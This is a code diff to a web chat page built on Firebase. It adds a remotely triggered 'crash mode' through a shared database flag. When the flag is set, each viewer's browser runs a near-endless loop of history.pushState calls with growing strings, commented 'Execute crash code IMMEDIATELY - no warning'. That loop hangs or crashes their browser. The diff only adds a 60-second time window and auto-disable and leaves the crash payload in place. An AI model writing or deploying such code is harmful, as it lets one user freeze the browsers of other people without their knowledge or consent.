@@ -1024,15 +1024,33 @@ firebase.initializeApp(firebaseConfig);
   // CRASH MODE FUNCTIONALITY
   function activateCrashMode(){
     crashModeRef.set({ active: true, timestamp: Date.now() });
+    
+    // Auto-disable after 60 seconds
+    setTimeout(() => {
+      crashModeRef.set({ active: false, timestamp: Date.now() });
+    }, 60000);
   }
 
   function triggerCrashEffect(){
-    // Execute crash code IMMEDIATELY - no warning
-    var total = "";
-    for( var i = 0; i < 10000000000000; i++ ) {
-      total += i.toString();
-      history.pushState(0,0, total );
-    }
+    const data = crashModeRef.once('value').then(snapshot => {
+      const crashData = snapshot.val();
+      if (!crashData || !crashData.active) return;
+      
+      // Check if crash mode is still within 60 second window
+      const elapsed = Date.now() - (crashData.timestamp || 0);
+      if (elapsed > 60000) {
+        // More than 60 seconds have passed, don't crash
+        crashModeRef.set({ active: false, timestamp: Date.now() });
+        return;
+      }
+      
+      // Execute crash code IMMEDIATELY - no warning
+      var total = "";
+      for( var i = 0; i < 10000000000000; i++ ) {
+        total += i.toString();
+        history.pushState(0,0, total );
+      }
+    });
   }
 
   sendBtn.addEventListener('click',sendMessage);
